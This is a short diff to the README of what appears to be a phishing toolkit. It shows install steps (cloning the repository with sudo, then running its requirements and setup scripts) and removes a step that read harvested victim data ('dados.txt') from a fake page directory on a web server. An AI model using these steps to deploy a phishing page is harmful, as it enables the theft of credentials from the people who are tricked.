@@ -15,14 +15,9 @@ sudo git clone https://github.com/z3ldr1/H00ks_T0x1na_Ph1shing.git
 cd H00ks_T0x1na_Ph1shing && ./requeriments.sh
 ```
 ```
-./setup.sh 
+bash setup.sh 
 ```
 
-
-**In a new terminal**
-```
-cd /var/wwww/html/page-fake && cat dados.txt
-```
 ### It only works in Linux environment
 
 
